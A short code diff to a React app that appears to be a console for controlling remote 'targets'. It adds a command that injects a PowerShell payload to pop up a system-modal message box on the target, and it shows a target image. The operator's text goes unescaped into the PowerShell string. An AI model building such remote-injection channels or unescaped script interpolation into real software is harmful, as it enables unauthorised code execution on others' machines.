@@ -167,6 +167,18 @@ class App extends Component<{}, AppState> {
 
     if (action === "clear") {
       this.setState({ stdout: [] });
+    } else if (action === "$") {
+        switch(rest[0]) {
+          case "msg":
+            const msg = rest.slice(1).join(" ")
+            this.sendToTarget({
+              type: "INJECT",
+              payload: `
+              [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") 
+              [Microsoft.VisualBasic.Interaction]::MsgBox("${msg}", "OkOnly,SystemModal,Information,DefaultButton1", "")
+              `
+            });
+        }
     } else {
       console.log("sending");
 
@@ -274,7 +286,7 @@ class App extends Component<{}, AppState> {
             target={target}
             onSelect={this.selectTarget}
           />
-           <img width={200} src={`data:image/png;base64, ${img}`} alt="Red dot" />
+           {img && <img width={200} src={`data:image/png;base64, ${img}`} alt="Red dot" /> }
         </div>
         {right}
         <div className={styles.bottom}>{bottom}</div>
